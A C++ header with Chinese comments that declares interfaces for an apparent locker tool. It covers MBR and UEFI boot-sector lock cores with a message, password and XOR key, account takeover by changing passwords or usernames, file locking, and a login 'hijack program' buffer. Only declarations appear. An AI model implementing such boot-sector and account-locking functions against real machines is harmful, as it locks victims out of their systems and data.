#include"DiskOperation.h"
#include"others.h"
#include"user.h"
using namespace std;
struct LockCore {
    bool useBuiltInLock = true; // 是否使用内置锁芯，默认为true
    unsigned char color;    // 颜色信息
    char showmsg[128];      // 显示消息
    char psw[32];           // 密码
    unsigned char Xorkey;            //异或密钥 
    unsigned char UefiLockCore[1024]; //UEFI锁芯
    unsigned char MBRLockCore[512]; //MBR锁芯
};
struct UserLockSetting
{
    LPWSTR newPassword; // 要更改的密码
    bool changeOriginalUsername=true; // 是更改原来账户的用户名还是新建一个账户并且禁用原来账户，默认为更改原来的用户名true
    LPWSTR newUsername; // 要更改的账户名称/要新建的账户名称
};
struct LoginLockSetting{
    string ShowMsg;
    unsigned char XorKey;
    string password;
    unsigned LockCore[4096]; //劫持程序
};
int DiskLock(LockCore locker);
int UserLock(UserLockSetting setting);
int FileLock(string password);
int LoginLock(LoginLockSetting setting);

